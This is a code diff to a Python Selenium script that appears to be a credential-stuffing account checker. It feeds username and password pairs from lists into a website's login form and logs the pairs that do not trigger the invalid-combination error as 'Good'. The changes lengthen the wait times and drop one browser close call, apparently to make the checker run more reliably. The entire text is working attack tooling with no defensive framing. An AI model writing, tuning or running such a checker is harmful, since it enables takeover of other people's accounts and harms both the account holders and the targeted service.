@@ -39,7 +39,7 @@ for index in range(len(users)):
 			browser = webdriver.Chrome()
 			browser.set_window_size(500,700)
 			browser.get(page)
-			time.sleep(1)
+			time.sleep(4)
 			email_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div[2]/div[1]/main/div/div[1]/form/div/div[1]/div/input')
 			email_box.send_keys(users[index])
 			time.sleep(1)
@@ -48,7 +48,7 @@ for index in range(len(users)):
 			time.sleep(1)
 			log_in = browser.find_element_by_xpath('//*[@id="root"]/div/div/div/div/div[2]/div[1]/main/div/div[1]/form/div/div[3]/button')
 			log_in.click()
-			time.sleep(1)
+			time.sleep(3)
 			invalid_email_text = browser.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div[2]/div[1]/main/div/div[1]/form/div/div[3]')
 			error = invalid_email_text.text
 			if 'That email and password combination is not valid.' in str(error):
@@ -59,7 +59,6 @@ for index in range(len(users)):
 				print('Finished at combo {}\n'.format(users[index]+':'+passwords[index]))
 				browser.close()
 				exit()
-			browser.close()
 		except (NoSuchElementException, ElementClickInterceptedException):
 			account_results.write(users[index]+':'+passwords[index]+' ---> Good \n')
 			browser.close()
